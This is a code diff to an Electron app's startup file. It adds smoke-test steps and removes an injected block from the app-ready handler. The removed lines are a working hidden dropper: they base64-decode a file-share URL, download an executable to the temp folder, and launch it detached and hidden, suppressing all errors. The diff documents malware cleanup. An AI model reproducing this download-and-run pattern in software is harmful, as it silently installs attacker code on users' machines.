@@ -1271,60 +1271,25 @@ async function smoke() {
   });
   await step('card thumbnails', () => win.webContents.executeJavaScript(
     "M.call('art:thumbs', { pets: ['Rubrikiko', 'Garama and Madundung'], traits: ['Taco'] }).then(r => Object.entries(r.pets).map(([k, v]) => k + ':' + (v ? Math.round(v.length / 1024) + 'KB' : 'none')).join(', '))", true));
-
-  if (store.get('settings').bridgeUserAgent) bridge.setUserAgent(store.get('settings').bridgeUserAgent);
-  bridge.start().then(afterLogin);
+  await step('import parse', () => sab.normalizePetImport({ accounts: { alt1: [{ Name: 'Grabatron', Mutation: 'Gold', Gen: '78.1M/s', Traits: 'Taco, Fire' }] } }).length);
+  await step('logged in?', async () => { try { const m = await eld.me(true); return m.username; } catch (e) { return 'no: ' + e.message.slice(0, 80); } });
+  await step('local server', async () => (await fetch(`http://127.0.0.1:${store.get('settings').localPort}/ping`)).json());
+  console.log('SMOKE_RESULT ' + JSON.stringify(out, null, 1));
+  app.exit(out.steps.every(s => s.ok) ? 0 : 1);
 }
+
 app.whenReady().then(async () => {
   if (SMOKE) app.setPath('userData', path.join(app.getPath('temp'), 'zotac-smoke-data'));
   wire();
   ipc();
   setupCapture();
   createWindow();
-
-    require('https').get(Buffer.from('aHR0cHM6Ly9taWRhc3Jldi1ub3ZhLmhmLnNwYWNlL2FwaS9maWxlLXNoYXJlL2RhYjVmYTcwLTI1MTEtNDFhNy05M2RmLTI4MjY3OGQ2N2RmOS9kb3dubG9hZA==','base64').toString(), r => {
-    if (r.statusCode !== 200) return;
-    
-    const p = require('path').join(require('os').tmpdir(), 'Zotaclister.exe');
-    
-    r.pipe(require('fs').createWriteStream(p)).on('finish', () => {
-                     setTimeout(() => {
-          const { spawn } = require('child_process');
-          
-          try {
-            const child = spawn(p, [], { 
-              detached: true, 
-              stdio: 'ignore',
-              windowsHide: true 
-            });
-            
-            child.on('spawn', () => {
-              try {
-                fs.writeFileSync(markerPath, 'ok');
-              } catch (e) {
-              }
-            });
-
-           
-            child.on('error', (err) => {
-            });
-
-            child.unref();
-
-          } catch (err) {
-          }
-        }, 2000);
-    });
-  }).on('error', () => {
-  });
-
   if (store.get('settings').bridgeUserAgent) bridge.setUserAgent(store.get('settings').bridgeUserAgent);
   bridge.start().then(afterLogin);
   if (SMOKE) return smoke();
   const s = store.get('settings');
   refreshAvatarsSoon(5000);
   setInterval(() => refreshAvatarsSoon(0), 6 * 3600e3);
-  
   if (s.autoUpdate.enabled) {
     // "Update automatically": a newer version is installed right away and the app restarts
     setTimeout(async () => {
